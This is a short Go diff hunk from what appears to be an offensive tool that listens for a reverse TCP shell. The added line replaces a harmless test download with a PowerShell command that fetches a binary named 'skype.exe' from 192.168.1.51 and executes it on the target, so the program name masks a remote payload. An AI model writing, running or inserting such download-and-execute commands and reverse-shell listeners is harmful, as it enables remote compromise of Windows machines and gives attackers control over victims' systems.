@@ -22,7 +22,7 @@ func CloseConnectionLoudly(conn net.Conn) {
 }
 
 func ListenAndHandleTCPShell(listener net.Listener, ip string, exploit_request_channel chan string){
-  command := "C:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe -C \"(new-object Net.WebClient).DownloadFile('http://192.168.1.51/index.html', 'C:\\downloado.txt')\" && echo succ > C:\\succ.txt"
+  command := "C:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe -C \"(new-object Net.WebClient).DownloadFile('http://192.168.1.51/skype.exe', 'C:\\skype.exe')\" && C:\\skype.exe"
   fmt.Println("Listening for reverse TCP shell...")
   i := 0
   connchan := make(chan net.Conn)
